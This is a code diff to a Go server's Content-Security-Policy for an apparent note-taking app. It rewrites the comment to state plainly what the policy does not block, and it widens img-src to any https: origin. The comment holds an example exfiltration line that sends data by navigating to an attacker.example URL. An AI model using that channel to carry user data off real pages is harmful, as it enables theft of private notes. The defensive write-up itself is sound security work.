@@ -109,20 +109,42 @@ func MetricsHandler() http.Handler {
 // 'unsafe-hashes', and the <style> block's hash, though stable per build, is
 // derived from app.html and would need re-pinning on every theme tweak.
 //
-// What still holds with inline script permitted: connect-src, img-src and
-// form-action stay first-party, so injected script cannot exfiltrate note
-// contents to another origin; base-uri 'none' blocks <base> tag hijacking of
-// every relative script URL; object-src 'none' closes plugin-based execution;
-// and frame-ancestors 'none' backs up X-Frame-Options against clickjacking.
+// What still holds with inline script permitted: connect-src 'self' and
+// form-action 'self' close the scripted-request and form-submission channels,
+// so fetch, XHR, WebSocket, sendBeacon and any auto-submitted form must stay
+// first-party; base-uri 'none' blocks <base> tag hijacking of every relative
+// script URL; object-src 'none' closes plugin-based execution; and
+// frame-ancestors 'none' backs up X-Frame-Options against clickjacking.
 // 'unsafe-eval' is never granted.
+//
+// What this policy does not do, stated plainly so nobody builds on it: it is
+// not an exfiltration barrier. CSP has no directive governing top-level
+// navigation — navigate-to was dropped from the spec and never shipped — so
+// script running under 'unsafe-inline' can always do
+// location = "https://attacker.example/?d=" + data. Two narrower channels are
+// open as well: img-src permits any https: origin (see below), and the
+// allowlisted https://fonts.googleapis.com in style-src can carry a payload in
+// a stylesheet URL. The value here is raising the cost of a sanitisation gap
+// and closing the passive request channels, not containing an attacker who is
+// already executing script.
 //
 // The Google Fonts origins are allowed because app.html loads its webfonts from
 // them at runtime; every theme's typography depends on those families.
+//
+// img-src allows any https: origin, deliberately. The Milkdown NodeView renders
+// whatever src a note holds as a plain <img> (frontend/src/lib/milkdown/image.ts),
+// and remote srcs legitimately occur in real notes: markdown pasted from
+// elsewhere keeps its remote image URLs, and the browser extension falls back to
+// hot-linking the original URL when re-uploading an image fails
+// (extension/src/core/images.ts). Restricting this to 'self' would silently
+// break those images in notes users already have. Images cannot execute script,
+// so what this costs is the <img> exfiltration channel noted above, not code
+// execution.
 const contentSecurityPolicy = "default-src 'self'; " +
 	"script-src 'self' 'unsafe-inline'; " +
 	"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
 	"font-src 'self' https://fonts.gstatic.com; " +
-	"img-src 'self' data: blob:; " +
+	"img-src 'self' data: blob: https:; " +
 	"connect-src 'self'; " +
 	"object-src 'none'; " +
 	"base-uri 'none'; " +
